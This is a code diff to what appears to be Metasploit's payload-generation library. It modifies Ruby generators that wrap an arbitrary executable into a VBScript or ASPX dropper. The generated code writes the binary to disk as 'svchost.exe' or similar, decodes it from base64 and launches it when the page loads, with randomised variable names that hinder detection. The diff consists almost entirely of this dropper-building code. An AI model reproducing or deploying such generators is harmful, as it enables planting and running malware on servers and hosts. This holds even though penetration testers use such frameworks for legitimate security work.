@@ -908,7 +908,7 @@ End Sub
 		delay   = opts[:delay]   || 5
 		persist = opts[:persist] || false
 
-		exe = exes.unpack("H*").join		vbs = ""
+		exe = exes.unpack("H*").join
 		vbs = ""
 
 		var_bytes   = Rex::Text.rand_text_alpha(rand(8)+8) 
@@ -992,7 +992,6 @@ End Sub
 		vbs << "#{var_obj}.CreateFolder(#{var_basedir})\r\n"
 		vbs << "#{var_tempexe} = #{var_basedir} & \"\\\" & \"svchost.exe\"\r\n"
 		vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(#{var_tempexe},2,0)\r\n"
-
 		vbs << "For x = 1 To Len(#{var_bytes})-3 Step 2\r\n"
 		vbs << "#{var_byte} = Chr(38) & \"H\" & Mid(#{var_bytes}, x, 2)\r\n"
 		vbs << "#{var_stream}.write Chr(#{var_byte})\r\n"
@@ -1013,8 +1012,8 @@ End Sub
 	end
 
 	def self.to_exe_aspx(exes = '', opts={})
-		exe = exes.unpack('C*')
-
+		#exe = exes.unpack('H*').join
+		exe = Rex::Text.encode_base64(exes)
 		var_file = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)
@@ -1022,6 +1021,9 @@ End Sub
 		var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_iterator = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_proc = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_fs = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_bytes = Rex::Text.rand_text_alpha(rand(8)+8)
+
 
 		source = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" %>\r\n"
 		source << "<%@ Import Namespace=\"System.IO\" %>\r\n"
@@ -1029,14 +1031,14 @@ End Sub
 		source << "\tprotected void Page_Load(object sender, EventArgs e)\r\n"
 		source << "\t{\r\n"
 		source << "\t\tStringBuilder #{var_file} = new StringBuilder();\r\n"
-		source << "\t\t#{var_file}.Append(\"\\x#{exe[0].to_s(16)}"
+		source << "\t\t#{var_file}.Append(\"#{exe[0]}"
 
-		1.upto(exe.length-1) do |byte|
+		1.upto(exe.length-1) do |character|
 				# Apparently .net 1.0 has a limit of 2046 chars per line
-				if(byte % 100 == 0)
+				if(character % 1000 == 0)
 						source << "\");\r\n\t\t#{var_file}.Append(\""
 				end
-				source << "\\x#{exe[byte].to_s(16)}"
+				source << exe[character]
 		end
 
 		source << "\");\r\n"
@@ -1046,17 +1048,15 @@ End Sub
 		source << "\r\n"
 		source << "\t\tDirectory.CreateDirectory(#{var_basedir});\r\n"
 		source << "\r\n"
-		source << "\t\tFileStream fs = File.Create(#{var_tempexe});\r\n"
+		source << "\t\tFileStream #{var_fs} = File.Create(#{var_tempexe});\r\n"
 		source << "\t\ttry\r\n"
 		source << "\t\t{\r\n"
-		source << "\t\t\tforeach (char #{var_iterator} in #{var_file}.ToString())\r\n"
-		source << "\t\t\t{\r\n"
-		source << "\t\t\t\tfs.WriteByte(Convert.ToByte(#{var_iterator}));\r\n"
-		source << "\t\t\t}\r\n"
+		source << "\t\t\tbyte[] #{var_bytes} = Convert.FromBase64String(#{var_file}.ToString());\r\n" 
+		source << "\t\t\t#{var_fs}.Write(#{var_bytes},0, #{var_bytes}.Length);\r\n"
 		source << "\t\t}\r\n"
 		source << "\t\tfinally\r\n"
 		source << "\t\t{\r\n"
-		source << "\t\t\tif (fs != null) ((IDisposable)fs).Dispose();\r\n"
+		source << "\t\t\tif (#{var_fs} != null) ((IDisposable)#{var_fs}).Dispose();\r\n"
 		source << "\t\t}\r\n"
 		source << "\r\n"
 		source << "\t\tSystem.Diagnostics.Process #{var_proc} = new System.Diagnostics.Process();\r\n"
